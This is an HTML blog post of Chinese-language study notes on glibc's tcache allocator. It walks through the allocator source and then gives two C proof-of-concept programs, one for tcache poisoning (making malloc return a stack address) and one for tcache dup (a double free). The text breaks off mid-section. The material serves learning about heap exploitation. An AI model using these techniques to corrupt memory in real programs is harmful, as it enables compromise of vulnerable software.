@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+
+
+  <html class="dark page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>tcache | pz1o</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="heap," />
+  
+
+  <meta name="description" content="down的wiki，便于自己多看。主要梳理一下结构。 0x01 Introductiontcache是glibc 2.26(Ubuntu 17.10)之后引入的一种技术，其目的是为了提升堆管理的性能。 1.结构体tcache_entry 和 tcache_perthread_struct 12345678&#x2F;* We overlay this structure on the user-data p">
+<meta property="og:type" content="article">
+<meta property="og:title" content="tcache">
+<meta property="og:url" content="https://pz1o.top/2021/03/08/tcache/index.html">
+<meta property="og:site_name" content="pz1o">
+<meta property="og:description" content="down的wiki，便于自己多看。主要梳理一下结构。 0x01 Introductiontcache是glibc 2.26(Ubuntu 17.10)之后引入的一种技术，其目的是为了提升堆管理的性能。 1.结构体tcache_entry 和 tcache_perthread_struct 12345678&#x2F;* We overlay this structure on the user-data p">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pz1o.top/2021/03/08/tcache/20210201102625163.png">
+<meta property="og:image" content="https://pz1o.top/2021/03/08/tcache/20210201160752119.jpg">
+<meta property="og:image" content="https://pz1o.top/2021/03/08/tcache/image-20210314162103060.png">
+<meta property="og:image" content="https://pz1o.top/2021/03/08/tcache/image-20210314165503011.png">
+<meta property="og:image" content="https://pz1o.top/2021/03/08/tcache/image-20210314165645714.png">
+<meta property="og:image" content="https://pz1o.top/2021/03/08/tcache/image-20210314213639524.png">
+<meta property="og:image" content="https://pz1o.top/2021/03/08/tcache/image-20210314215452014.png">
+<meta property="og:image" content="https://pz1o.top/2021/03/08/tcache/image-20210314215557280.png">
+<meta property="og:image" content="https://pz1o.top/2021/03/08/tcache/image-20210314215657530.png">
+<meta property="og:image" content="https://pz1o.top/2021/03/08/tcache/image-20210318152451146.png">
+<meta property="og:image" content="https://pz1o.top/2021/03/08/tcache/image-20210318153644695.png">
+<meta property="og:image" content="https://pz1o.top/2021/03/08/tcache/image-20210318153928275.png">
+<meta property="og:image" content="https://pz1o.top/2021/03/08/tcache/image-20210318154115014.png">
+<meta property="og:image" content="https://pz1o.top/2021/03/08/tcache/image-20210318154918326.png">
+<meta property="og:image" content="https://pz1o.top/2021/03/08/tcache/image-20210318164858035.png">
+<meta property="og:image" content="https://pz1o.top/2021/03/08/tcache/image-20210318165216882.png">
+<meta property="og:image" content="https://pz1o.top/2021/03/08/tcache/image-20210318174356049.png">
+<meta property="article:published_time" content="2021-03-08T10:05:58.000Z">
+<meta property="article:modified_time" content="2021-03-18T10:03:52.248Z">
+<meta property="article:author" content="pz1o">
+<meta property="article:tag" content="heap">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pz1o.top/2021/03/08/tcache/20210201102625163.png">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbeddx" rel="stylesheet">
+
+
+  
+    
+<link rel="stylesheet" href="/css/personal-style.css">
+
+  
+
+  
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-38189205-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?e90b4c8b8c36ca2b3e5798ef67088f84";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="pz1o" type="application/atom+xml">
+</head>
+
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">MAP</span>
+  
+
+  <div class="post-header LEFT">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">MAP</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="ROUND_RECT"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            Blog
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="ROUND_RECT"
+            href="/tag/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            Tag
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="ROUND_RECT"
+            href="/about/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            About
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">Posts List</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-Introduction"><span class="toc-text">0x01 Introduction</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-结构体"><span class="toc-text">1.结构体</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-执行流程"><span class="toc-text">2.执行流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-源码分析"><span class="toc-text">3.源码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#初始化"><span class="toc-text">初始化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#内存申请"><span class="toc-text">内存申请</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tcache-get"><span class="toc-text">tcache_get()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#内存释放"><span class="toc-text">内存释放</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tcache-put"><span class="toc-text">tcache_put()</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-PWN-tcache"><span class="toc-text">0x02 PWN tcache</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-tcache-poisoning"><span class="toc-text">1.tcache poisoning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-tcache-dup"><span class="toc-text">2.tcache dup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-tcache-house-of-spirit"><span class="toc-text">3.tcache house of spirit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-tcache-stashing-unlink-attack"><span class="toc-text">4.tcache stashing unlink attack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-libc-leak"><span class="toc-text">5.libc leak</span></a></li></ol></li></ol>
+  </div>
+
+
+
+<div class="content content-post LEFT">
+   <article id="post-tcache" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">tcache</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2021.03.08</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>pz1o</span>
+        </span>
+      
+
+      
+
+
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <p>down的wiki，便于自己多看。主要梳理一下结构。</p>
+<h1 id="0x01-Introduction"><a href="#0x01-Introduction" class="headerlink" title="0x01 Introduction"></a>0x01 Introduction</h1><p>tcache是glibc 2.26(Ubuntu 17.10)之后引入的一种技术，其目的是为了提升堆管理的性能。</p>
+<h2 id="1-结构体"><a href="#1-结构体" class="headerlink" title="1.结构体"></a>1.结构体</h2><p><code>tcache_entry</code> 和 <code>tcache_perthread_struct</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><code>tcache_entry</code> 用于链接空闲的 chunk 结构体，其中的 <code>next</code> 指针指向下一个大小相同的 chunk。</p>
+<p>需要注意的是这里的 <strong>next 指向 chunk 的 user data，而 fastbin 的 fd 指向 chunk 开头的地址。</strong></p>
+<p>而且，tcache_entry 会复用空闲 chunk 的 user data 部分。</p>
+<p>如图<img src="/2021/03/08/tcache/20210201102625163.png" alt="在这里插入图片描述"></p>
+</blockquote>
+<hr>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence "tcache_perthread_struct").  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_MAX_BINS                64</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>tcache_perthread_struct是用来管理tcache链表的，这个结构体位于heap段的起始位置，size大小为0x251。每一个thread都会维护一个tcache_perthread_struct结构体，一共有TCACHE_MAX_BINS个计数器TCACHE_MAX_BINS项tcache_entry。</p>
+<ul>
+<li>tcache_entry 用单向链表的方式链接了相同大小的处于空闲状态（free 后）的 chunk</li>
+<li>counts 记录了 tcache_entry 链上空闲 chunk 的数目，每条链上最多可以有 7 个 chunk</li>
+</ul>
+<p><img src="/2021/03/08/tcache/20210201160752119.jpg" alt="在这里插入图片描述"></p>
+</blockquote>
+<h2 id="2-执行流程"><a href="#2-执行流程" class="headerlink" title="2.执行流程"></a>2.执行流程</h2><ol>
+<li>第一次malloc，会分配一块大内存存放<code>tcache_perthread_struct</code>，一般为0x251</li>
+<li>释放chunk时，如果chunk的size小于small bin size，在<strong>进入tcache之前</strong>会先放进fastbin或者unsorted bin中</li>
+<li>在<strong>放入tcache后</strong>：<ul>
+<li>先放到对应的tcache中，直到tcache被填满（7个）</li>
+<li><strong>tcache被填满后</strong>，接下来再释放chunk，就会直接放进fastbin或者unsorted bin中</li>
+<li>tcache中的chunk<strong>不会发生合并</strong>，不取消inuse bit</li>
+</ul>
+</li>
+<li>重新申请chunk，并且申请的size符合tcache的范围，则先从<strong>tcache中取chunk</strong>，直到tcache为空</li>
+<li>tcache为空后，从bin中找</li>
+<li>tcache为空时，如果fastbin、small bin、unsorted bin中有size符合的chunk，会先把fastbin、small bin、unsorted bin中的chunk放到tcache中，直到填满，之后再从tcache中取</li>
+</ol>
+<h2 id="3-源码分析"><a href="#3-源码分析" class="headerlink" title="3.源码分析"></a>3.源码分析</h2><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">tcache_init(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">size_t</span> bytes = <span class="keyword">sizeof</span> (tcache_perthread_struct);</span><br><span class="line">  <span class="keyword">if</span> (tcache_shutting_down)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  arena_get (ar_ptr, bytes); <span class="comment">// 找到可用的 arena</span></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes); <span class="comment">// 申请一个 sizeof(tcache_perthread_struct) 大小的 chunk</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line">  <span class="comment">/* In a low memory situation, we may not be able to allocate memory</span></span><br><span class="line"><span class="comment">     - in which case, we just keep trying later.  However, we</span></span><br><span class="line"><span class="comment">     typically do this very early, so either there is sufficient</span></span><br><span class="line"><span class="comment">     memory, or there isn't enough memory to do non-trivial</span></span><br><span class="line"><span class="comment">     allocations anyway.  */</span></span><br><span class="line">  <span class="keyword">if</span> (victim) <span class="comment">// 初始化 tcache</span></span><br><span class="line">    &#123;</span><br><span class="line">      tcache = (tcache_perthread_struct *) victim;</span><br><span class="line">      <span class="built_in">memset</span> (tcache, <span class="number">0</span>, <span class="keyword">sizeof</span> (tcache_perthread_struct));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>这里初始化了tcache</p>
+<p>主要就是找arena和分配chunk</p>
+</blockquote>
+<h3 id="内存申请"><a href="#内存申请" class="headerlink" title="内存申请"></a>内存申请</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">// 从 tcache list 中获取内存</span></span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>首先是在tcache中有chunk的时候，if判断要取出的chunk的size是否满足idx的合法范围，在tcache-&gt;entries不为空时调用<code>tcache_get()</code>函数获取chunk。</p>
+</blockquote>
+<h3 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get()"></a>tcache_get()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];<span class="comment">//获取指针</span></span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);<span class="comment">//检查</span></span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;<span class="comment">//替换下一个指针</span></span><br><span class="line">  --(tcache-&gt;counts[tc_idx]); </span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>从<code>tcache-&gt;entries[tc_idx]</code>获取一个chunk指针，并且<code>tcache-&gt;counts</code>减一，没有过多的安全检查或者保护</p>
+</blockquote>
+<h3 id="内存释放"><a href="#内存释放" class="headerlink" title="内存释放"></a>内存释放</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ......</span><br><span class="line">  ......</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">        &amp;&amp; tc_idx &lt; mp_.tcache_bins <span class="comment">// 64</span></span><br><span class="line">        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) <span class="comment">// 7</span></span><br><span class="line">      &#123;</span><br><span class="line">        tcache_put (p, tc_idx);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  ......</span><br><span class="line">  ......</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>可以看到首先判断<code>tc_idx</code>的合法性，判断<code>tcache-&gt;counts[tc_idx]</code>在7个以内时，进入<code>tcache_put()</code>函数，传递的一参为要释放的chunk指针，二参为chunk对应的size在tcache中的下标</p>
+</blockquote>
+<h3 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put()"></a>tcache_put()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<span class="comment">//释放的chunk</span></span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);<span class="comment">//判断下标是否符合</span></span><br><span class="line">  <span class="comment">//链表的替换</span></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  <span class="comment">//数量增加</span></span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>tcache_put()函数执行过程中把释放的chunk插入到了tcache-&gt;entries[tc_idx]链表的头部，整个插入的过程中也没有做任何的安全检查及保护，也没有将P标志位变为0</p>
+</blockquote>
+<p>其实我们也发现了，重点攻击的地方应该就是<code>tcache_get</code>和<code>tcache_put</code>两个地方。</p>
+<h1 id="0x02-PWN-tcache"><a href="#0x02-PWN-tcache" class="headerlink" title="0x02 PWN tcache"></a>0x02 PWN tcache</h1><h2 id="1-tcache-poisoning"><a href="#1-tcache-poisoning" class="headerlink" title="1.tcache poisoning"></a>1.tcache poisoning</h2><p>tcache poisoning主要的利用手段是覆盖tcache中的next成员变量，由于tcache_get()函数没有对next进行检查，所以理论上来讲如果我们将next中的地址进行替换，不需要伪造任何chunk结构即可实现malloc到任何地址。</p>
+<p><img src="/2021/03/08/tcache/image-20210314162103060.png" alt="image-20210314162103060"></p>
+<p>此时如果把图中fd值改为我们想要的值，那么攻击就成功了。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// disable buffering</span></span><br><span class="line">	setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">size_t</span> stack_var;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The address we want malloc() to return is %p.\n"</span>, (<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"malloc(128): %p\n"</span>, a);</span><br><span class="line">	<span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"malloc(128): %p\n"</span>, b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Freeing the buffers...\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line">	sleep(<span class="number">0</span>);</span><br><span class="line">	b[<span class="number">0</span>] = (<span class="keyword">intptr_t</span>)&amp;stack_var;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now the tcache list has [ %p -&gt; %p ].\n"</span>, b, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"1st malloc(128): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now the tcache list has [ %p ].\n"</span>, &amp;stack_var);</span><br><span class="line">	sleep(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"2nd malloc(128): %p\n"</span>, c);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We got the control\n"</span>);</span><br><span class="line"></span><br><span class="line">	assert((<span class="keyword">long</span>)&amp;stack_var == (<span class="keyword">long</span>)c);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>sleep()为断点</p>
+</blockquote>
+<p>先看第一个断点下</p>
+<p><img src="/2021/03/08/tcache/image-20210314165503011.png" alt="image-20210314165503011"></p>
+<p>第二个断点</p>
+<p><img src="/2021/03/08/tcache/image-20210314165645714.png" alt="image-20210314165645714"></p>
+<p>很明显，当我们再次分配时，那么就会分配走我们想要的地址。</p>
+<h2 id="2-tcache-dup"><a href="#2-tcache-dup" class="headerlink" title="2.tcache dup"></a>2.tcache dup</h2><p>上面的是针对malloc，这个针对的是free</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This file demonstrates a simple double-free attack with tcache.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Allocating buffer.\n"</span>);</span><br><span class="line">	<span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"malloc(8): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Freeing twice...\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	sleep(<span class="number">0</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now the free list has [ %p, %p ].\n"</span>, a, a);</span><br><span class="line">	<span class="keyword">void</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">void</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Next allocated buffers will be same: [ %p, %p ].\n"</span>, b, c);</span><br><span class="line">	sleep(<span class="number">0</span>);</span><br><span class="line">	assert((<span class="keyword">long</span>)b == (<span class="keyword">long</span>)c);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>直接看第一次断点</p>
+<p><img src="/2021/03/08/tcache/image-20210314213639524.png" alt="image-20210314213639524"></p>
+<p>两个是在一个位置，为什么会这样？</p>
+<p>我们可以来看一下<code>tcache_put</code>函数</p>
